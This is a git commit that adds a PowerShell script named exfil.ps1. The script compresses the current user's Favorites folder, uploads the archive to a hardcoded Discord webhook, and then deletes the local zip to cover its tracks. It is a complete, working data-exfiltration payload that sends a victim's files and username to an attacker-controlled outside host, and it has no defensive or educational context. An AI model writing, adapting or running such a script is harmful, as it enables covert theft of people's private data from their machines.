a9f441aa839f4488f6085d87d3b3d2b589773558
KC1LSR <66142920+KC1LSR@users.noreply.github.com>
2024-10-17 13:12:53 -0400

    exfil.ps1

---
+++ exfil.ps1
@@ -0,0 +1,49 @@
+############################################################################################################################################################
+
+# Get the current user's Favorites folder
+$FavoritesPath = "$env:USERPROFILE\Favorites"
+
+# Set the name for the zip file
+$FolderName = "FavoritesBackup"
+$ZIP = "$FolderName.zip"
+
+# Compress the Favorites folder into a zip
+Compress-Archive -Path $FavoritesPath -DestinationPath $env:tmp/$ZIP
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+};
+
+if (-not ([string]::IsNullOrEmpty($file))){
+    curl.exe -F "file1=@$file" $hookurl
+}
+}
+
+# Upload the zip file to Discord
+Upload-Discord -file "$env:tmp/$ZIP"
+
+############################################################################################################################################################
+
+# Clean up - remove the zip file from temp folder
+Remove-Item "$env:tmp/$ZIP" -Force
+
+############################################################################################################################################################
